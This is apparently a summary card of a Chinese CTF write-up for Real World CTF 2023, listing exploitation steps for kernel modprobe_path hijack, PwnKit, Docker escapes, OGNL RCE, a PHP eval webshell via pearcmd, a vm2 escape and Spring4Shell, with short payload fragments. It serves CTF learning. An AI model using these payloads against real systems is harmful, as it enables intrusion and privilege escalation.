---
title: "第五届 Real World CTF 体验赛 Writeup"
category: misc
tags: ["RealWorldCTF", "misc", "Linux-Kernel-5.19", "UAF", "race-condition", "modprobe_path"]
signals: ["RealWorldCTF 2023", "Linux-Kernel-5.19", "UAF", "race-condition", "modprobe_path", "keyctl-syscall", "PwnKit-CVE-2021-4034", "pkexec", "DirtyCow-vDSO", "heap_exploit", "RWCTF", "hijack", "PwnKit", "Docker"]
difficulty: hard
source: "https://www.ctfiot.com/91583.html"
tools: ["ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第五届 Real World CTF 体验赛 Writeup

> 赛事：RealWorldCTF 2023 | 方向：misc | 难度：hard | 工具：ROP

## 一句话总结

第五届 RWCTF 体验赛多方向：内核 modprobe_path hijack + PwnKit 提权 + Docker binfmt 逃逸 + OGNL RCE + Spring4Shell。

## 攻击链

1. Pwn Digging-into-Kernel-3: Linux 5.19.0 + /dev/rwctf 漏洞驱动 (UAF+race+leak)
2. keyring keyctl syscall 喷射 user_key_payload, key_revoke/key_unlink 释放
3. add(0, 0x100) + delete(0) + 50 user_key spray + double free 触发内核堆块复用
4. key_read 泄 heap (0xe8) + user_free_payload_rcu (0xf0) → vmlinux 基址
5. 提权: 改 modprobe_path = /tmp/x, /tmp/dummy 触发 modprobe → chmod 777 /flag
6. 二次利用: hijack /proc/self/stat seq_operations + ROP 调用 read + 写 modprobe_path
7. LPE PwnKit: GCONV_PATH=. + pwnkit.so gconv_init() setuid(0) + system("/bin/sh")
8. Docker Escaper-2: binfmt_misc 注册 + sshd motd 触发 host 命令
9. Docker Escaper-3: DirtyCow vDSO patch 触发 COW
10. BUS Driver: busctl --system call org.dbus.rwctf SayBoss s /tmp/exp.sh
11. Web Wiki-Hacker: OGNL RCE @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id"))
12. Web ApacheCommandText: ${base64decoder:JHtzY3JpcHQ6...}
13. Web Langurage-Expert: pearcmd.php register_argc_argv + config-create + <?=@eval($_POST[a]);?> 写 /tmp/1.php
14. Web Yummy Api: Mongodb 注入 + aes192 token 解密 + pre-script 上传 vm2 逃逸脚本
15. Web Spring4Shell: class.module.classLoader.resources.context.parent.pipeline.first.pattern + .directory + .prefix + .suffix + .appBase=/

## 关键 payload

```
modprobe_path hijack + pop_rax_ret + ret + gconv_init setuid(0) + GCONV_PATH=.
```

## 经验教训

内核 modprobe_path 持久提权是现代 Linux LPE 经典套路；PwnKit CVE-2021-4034 影响所有 polkit 版本；Spring4Shell class.module.classLoader pipeline 改写 appBase 绕过路径限制。

## 标签

Linux-Kernel-5.19、UAF、race-condition、modprobe_path、keyctl-syscall、PwnKit-CVE-2021-4034、pkexec、DirtyCow-vDSO、binfmt_misc、docker-escape、OGNL-RCE、Spring4Shell、vm2-sandbox-escape、pearcmd

## 参考来源

- https://www.ctfiot.com/91583.html
- 原文件：第五届_Real_World_CTF_体验赛_Writeup.full.md
